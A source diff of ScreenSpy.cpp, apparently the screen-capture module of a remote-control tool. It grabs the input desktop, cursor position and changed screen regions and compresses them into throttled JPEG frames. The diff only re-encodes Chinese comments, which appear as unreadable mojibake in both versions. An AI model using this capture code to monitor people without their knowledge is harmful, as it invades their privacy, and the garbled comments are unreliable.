@@ -1,4 +1,4 @@
-// ScreenSpy.cpp: implementation of the CScreenSpy class.
+ï»¿// ScreenSpy.cpp: implementation of the CScreenSpy class.
 //
 //////////////////////////////////////////////////////////////////////
 #include "StdAfx.h"
@@ -41,7 +41,7 @@ CScreenSpy::CScreenSpy(int biBitCount, bool bIsGray, UINT nMaxFrameRate)
 	QueryPerformanceFrequency(&m_liFreq);
 	
 	m_dwBitBltRop	= SRCCOPY;
-	m_bAlgorithm	= ALGORITHM_HOME; // Ä¬ÈÏÊ¹ÓÃ¼ÒÓÃ°ì¹«Ëã·¨
+	m_bAlgorithm	= ALGORITHM_HOME; // é»˜è®¤ä½¿ç”¨å®¶ç”¨åŠå…¬ç®—æ³•
 	m_nMaxFrameRate	= nMaxFrameRate;
 	m_liFreq.QuadPart /= nMaxFrameRate;
 	m_bIsGray		= bIsGray;
@@ -65,7 +65,7 @@ CScreenSpy::CScreenSpy(int biBitCount, bool bIsGray, UINT nMaxFrameRate)
 	::SelectObject(m_hLastMemDC, m_hLastBitmap);
 	::SelectObject(m_hCurrMemDC, m_hCurrBitmap);
 	
-	// ×ã¹»ÁË
+	// è¶³å¤Ÿäº†
 	m_changedBuffer = new BYTE[m_lpbmi_full->bmiHeader.biSizeImage * 2];
 	m_changedOffset = 0;
 	m_nPerLineDataSize = m_lpbmi_full->bmiHeader.biSizeImage / m_nFullHeight;
@@ -97,17 +97,17 @@ LPVOID CScreenSpy::getFirstScreen(LPDWORD lpdwBytes)
 	if (lpdwBytes == NULL || m_changedBuffer == NULL)
 		return NULL;
 	
-	// ÇĞ»»µ½µ±Ç°ÊäÈë×ÀÃæ
+	// åˆ‡æ¢åˆ°å½“å‰è¾“å…¥æ¡Œé¢
 	SelectInputWinStation();
 	
-	// ÖØÖÃ±ä»¯»º³åÇøÆ«ÒÆ
+	// é‡ç½®å˜åŒ–ç¼“å†²åŒºåç§»
 	m_changedOffset = 0;
 	
-	// Ğ´ÈëÊ¹ÓÃÁËÄÄÖÖËã·¨
+	// å†™å…¥ä½¿ç”¨äº†å“ªç§ç®—æ³•
 	BYTE	algorithm = (BYTE)m_bAlgorithm;
 	WriteChangedBuffer((LPBYTE)&algorithm, sizeof(algorithm));
 	
-	// »ñÈ¡·¢Éú±ä»¯µÄÊı¾İ
+	// è·å–å‘ç”Ÿå˜åŒ–çš„æ•°æ®
 	::BitBlt(m_hLastMemDC, 0, 0, m_nFullWidth, m_nFullHeight, m_hDeskTopDC, 0, 0, m_dwBitBltRop);
 	if (algorithm == ALGORITHM_HOME)
 	{
@@ -137,17 +137,17 @@ LPVOID CScreenSpy::getNextScreen(LPDWORD lpdwBytes)
 	if (lpdwBytes == NULL || m_changedBuffer == NULL)
 		return NULL;
 	
-	// ÇĞ»»µ½µ±Ç°ÊäÈë×ÀÃæ
+	// åˆ‡æ¢åˆ°å½“å‰è¾“å…¥æ¡Œé¢
 	SelectInputWinStation();
 	
-	// ÖØÖÃ±ä»¯»º³åÇøÆ«ÒÆ
+	// é‡ç½®å˜åŒ–ç¼“å†²åŒºåç§»
 	m_changedOffset = 0;
 	
-	// Ğ´ÈëÊ¹ÓÃÁËÄÄÖÖËã·¨
+	// å†™å…¥ä½¿ç”¨äº†å“ªç§ç®—æ³•
 	BYTE	algorithm = (BYTE)m_bAlgorithm;
 	WriteChangedBuffer((LPBYTE)&algorithm, sizeof(algorithm));
 	
-	// Ğ´Èëµ±Ç°¹â±êµÄÎ»ÖÃ
+	// å†™å…¥å½“å‰å…‰æ ‡çš„ä½ç½®
 	POINT	CursorPos;
 	GetCursorPos(&CursorPos);
 	float	fDpiRatio = (float)m_nFullWidth / GetSystemMetrics(SM_CXSCREEN);
@@ -155,11 +155,11 @@ LPVOID CScreenSpy::getNextScreen(LPDWORD lpdwBytes)
 	CursorPos.y = fDpiRatio * CursorPos.y + 0.5f;
 	WriteChangedBuffer((LPBYTE)&CursorPos, sizeof(POINT));
 	
-	// Ğ´Èëµ±Ç°¹â±êµÄÀàĞÍ
+	// å†™å…¥å½“å‰å…‰æ ‡çš„ç±»å‹
 	BYTE	CursorIndex = m_CursorInfo.getCurrentCursorIndex();
 	WriteChangedBuffer(&CursorIndex, sizeof(BYTE));
 	
-	// »ñÈ¡·¢Éú±ä»¯µÄÊı¾İ
+	// è·å–å‘ç”Ÿå˜åŒ–çš„æ•°æ®
 	::BitBlt(m_hCurrMemDC, 0, 0, m_nFullWidth, m_nFullHeight, m_hDeskTopDC, 0, 0, m_dwBitBltRop);
 	if (algorithm == ALGORITHM_HOME)
 	{
@@ -175,7 +175,7 @@ LPVOID CScreenSpy::getNextScreen(LPDWORD lpdwBytes)
 	}
 	*lpdwBytes = m_changedOffset;
 	
-	// ÏŞÖÆ·¢ËÍÖ¡µÄËÙ¶È
+	// é™åˆ¶å‘é€å¸§çš„é€Ÿåº¦
 	while (1)
 	{
 		QueryPerformanceCounter(&m_liCurr);
@@ -191,7 +191,7 @@ BOOL CScreenSpy::ScanChangedRect(BOOL bCopyChangedRect)
 {
 	LPDWORD p1, p2; RECT changedRect; HRGN hRgnChanged = NULL, hRgnCombine;
 	
-	for (int y = m_nScanLine; y < m_nFullHeight; y += DEF_YSTEP) // m_nScanLine Îª 0, ÊÇ×îºóÒ»ĞĞ
+	for (int y = m_nScanLine; y < m_nFullHeight; y += DEF_YSTEP) // m_nScanLine ä¸º 0, æ˜¯æœ€åä¸€è¡Œ
 	{
 		p1 = (LPDWORD)((LPBYTE)m_lpvLastBits + (m_nFullHeight - 1 - y) * m_nPerLineDataSize);
 		p2 = (LPDWORD)((LPBYTE)m_lpvCurrBits + (m_nFullHeight - 1 - y) * m_nPerLineDataSize);
@@ -279,13 +279,13 @@ int CScreenSpy::BMP_JPG(int width, int height, int cbit, int quality, void *inpu
 	struct jpeg_error_mgr jem;
 	unsigned long outlen = 0;
 	
-	// ÉèÖÃ´íÎó´¦Àí
+	// è®¾ç½®é”™è¯¯å¤„ç†
 	jcs.err = jpeg_std_error(&jem);
-	// ´´½¨Ñ¹Ëõ½á¹¹
+	// åˆ›å»ºå‹ç¼©ç»“æ„
 	jpeg_create_compress(&jcs);
-	// ÉèÖÃĞ´Èë(Êä³ö)Î»ÖÃ
+	// è®¾ç½®å†™å…¥(è¾“å‡º)ä½ç½®
 	jpeg_mem_dest(&jcs, (unsigned char **)output, &outlen);
-	// ÉèÖÃ±ØĞë²ÎÊı
+	// è®¾ç½®å¿…é¡»å‚æ•°
 	switch (cbit)
 	{
 	case 16:
@@ -306,11 +306,11 @@ int CScreenSpy::BMP_JPG(int width, int height, int cbit, int quality, void *inpu
 	}
 	jcs.image_width = width;
 	jcs.image_height = height;
-	// ÌîĞ´ÆäËüÄ¬ÈÏ²ÎÊı
+	// å¡«å†™å…¶å®ƒé»˜è®¤å‚æ•°
 	jpeg_set_defaults(&jcs);
-	// ÉèÖÃÍ¼ÏñÆ·ÖÊ, È¡Öµ·¶Î§ÊÇ[0-100], 0±íÊ¾Ôü»­ÖÊ£¬100±íÊ¾Âú»­ÖÊ
+	// è®¾ç½®å›¾åƒå“è´¨, å–å€¼èŒƒå›´æ˜¯[0-100], 0è¡¨ç¤ºæ¸£ç”»è´¨ï¼Œ100è¡¨ç¤ºæ»¡ç”»è´¨
 	jpeg_set_quality(&jcs, quality, true);
-	// ¿ªÊ¼Ñ¹ËõÍ¼Ïñ
+	// å¼€å§‹å‹ç¼©å›¾åƒ
 	jpeg_start_compress(&jcs, true);
 	int line_stride = (jcs.image_width * cbit / 8 + 3) / 4 * 4;
 	while (jcs.next_scanline < jcs.image_height)
@@ -318,9 +318,9 @@ int CScreenSpy::BMP_JPG(int width, int height, int cbit, int quality, void *inpu
 		unsigned char *pline = (unsigned char *)input + jcs.next_scanline * line_stride;
 		jpeg_write_scanlines(&jcs, &pline, 1);
 	}
-	// Íê³ÉÍ¼ÏñÑ¹Ëõ
+	// å®Œæˆå›¾åƒå‹ç¼©
 	jpeg_finish_compress(&jcs);
-	// ÊÍ·ÅÏà¹Ø×ÊÔ´
+	// é‡Šæ”¾ç›¸å…³èµ„æº
 	jpeg_destroy_compress(&jcs);
 	
 	return outlen;
@@ -335,8 +335,8 @@ void CScreenSpy::WriteChangedBuffer(LPBYTE lpData, int nCount)
 LPBITMAPINFO CScreenSpy::ConstructBitmapInfo(int biBitCount, int biWidth, int biHeight)
 {
 	/*
-	biBitCount Îª1 (ºÚ°×¶şÉ«Í¼) ¡¢4 (16 É«Í¼) ¡¢8 (256 É«Í¼) Ê±ÓÉÑÕÉ«±íÏîÊıÖ¸³öÑÕÉ«±í´óĞ¡
-	biBitCount Îª16 (16 Î»É«Í¼) ¡¢24 (Õæ²ÊÉ«Í¼, ²»Ö§³Ö) ¡¢32 (32 Î»É«Í¼) Ê±Ã»ÓĞÑÕÉ«±í
+	biBitCount ä¸º1 (é»‘ç™½äºŒè‰²å›¾) ã€4 (16 è‰²å›¾) ã€8 (256 è‰²å›¾) æ—¶ç”±é¢œè‰²è¡¨é¡¹æ•°æŒ‡å‡ºé¢œè‰²è¡¨å¤§å°
+	biBitCount ä¸º16 (16 ä½è‰²å›¾) ã€24 (çœŸå½©è‰²å›¾, ä¸æ”¯æŒ) ã€32 (32 ä½è‰²å›¾) æ—¶æ²¡æœ‰é¢œè‰²è¡¨
 	*/
 	int	color_num = biBitCount <= 8 ? 1 << biBitCount : 0;
 	
@@ -356,17 +356,17 @@ LPBITMAPINFO CScreenSpy::ConstructBitmapInfo(int biBitCount, int biWidth, int bi
 	lpbmih->biClrImportant = 0;
 	lpbmih->biSizeImage = (((lpbmih->biWidth * lpbmih->biBitCount + 31) & ~31) >> 3) * lpbmih->biHeight;
 	
-	// 16Î»ºÍÒÔºóµÄÃ»ÓĞÑÕÉ«±í£¬Ö±½Ó·µ»Ø
+	// 16ä½å’Œä»¥åçš„æ²¡æœ‰é¢œè‰²è¡¨ï¼Œç›´æ¥è¿”å›
 	if (biBitCount >= 16)
 		return lpbmi;
 	/*
-	Windows 95ºÍWindows 98£ºÈç¹ûlpvBits²ÎÊıÎªNULL²¢ÇÒGetDIBits³É¹¦µØÌî³äÁËBITMAPINFO½á¹¹£¬ÄÇÃ´·µ»ØÖµÎªÎ»Í¼ÖĞ×Ü¹²µÄÉ¨ÃèÏßÊı¡£
+	Windows 95å’ŒWindows 98ï¼šå¦‚æœlpvBitså‚æ•°ä¸ºNULLå¹¶ä¸”GetDIBitsæˆåŠŸåœ°å¡«å……äº†BITMAPINFOç»“æ„ï¼Œé‚£ä¹ˆè¿”å›å€¼ä¸ºä½å›¾ä¸­æ€»å…±çš„æ‰«æçº¿æ•°ã€‚
 	
-    Windows NT£ºÈç¹ûlpvBits²ÎÊıÎªNULL²¢ÇÒGetDIBits³É¹¦µØÌî³äÁËBITMAPINFO½á¹¹£¬ÄÇÃ´·µ»ØÖµÎª·Ç0¡£Èç¹ûº¯ÊıÖ´ĞĞÊ§°Ü£¬ÄÇÃ´½«·µ»Ø0Öµ¡£Windows NT£ºÈôÏë»ñµÃ¸ü¶à´íÎóĞÅÏ¢£¬Çëµ÷ÓÃcallGetLastErrorº¯Êı¡£
+    Windows NTï¼šå¦‚æœlpvBitså‚æ•°ä¸ºNULLå¹¶ä¸”GetDIBitsæˆåŠŸåœ°å¡«å……äº†BITMAPINFOç»“æ„ï¼Œé‚£ä¹ˆè¿”å›å€¼ä¸ºé0ã€‚å¦‚æœå‡½æ•°æ‰§è¡Œå¤±è´¥ï¼Œé‚£ä¹ˆå°†è¿”å›0å€¼ã€‚Windows NTï¼šè‹¥æƒ³è·å¾—æ›´å¤šé”™è¯¯ä¿¡æ¯ï¼Œè¯·è°ƒç”¨callGetLastErrorå‡½æ•°ã€‚
 	*/
 	
 	HDC	hDC = GetDC(NULL);
-	HBITMAP hBmp = CreateCompatibleBitmap(hDC, 1, 1); // ¸ß¿í²»ÄÜÎª0
+	HBITMAP hBmp = CreateCompatibleBitmap(hDC, 1, 1); // é«˜å®½ä¸èƒ½ä¸º0
 	GetDIBits(hDC, hBmp, 0, 0, NULL, lpbmi, DIB_RGB_COLORS);
 	ReleaseDC(NULL, hDC);
 	DeleteObject(hBmp);
@@ -419,7 +419,7 @@ BOOL CScreenSpy::SelectInputWinStation()
 	return bRet;	
 }
 
-// µ±Ç°ÊäÈëµÄÈÈµã
+// å½“å‰è¾“å…¥çš„çƒ­ç‚¹
 // LONG CScreenSpy::getKeyBoardHotspotY()
 // {
 // 	static	DWORD	dwCurrentThreadId = GetCurrentThreadId();
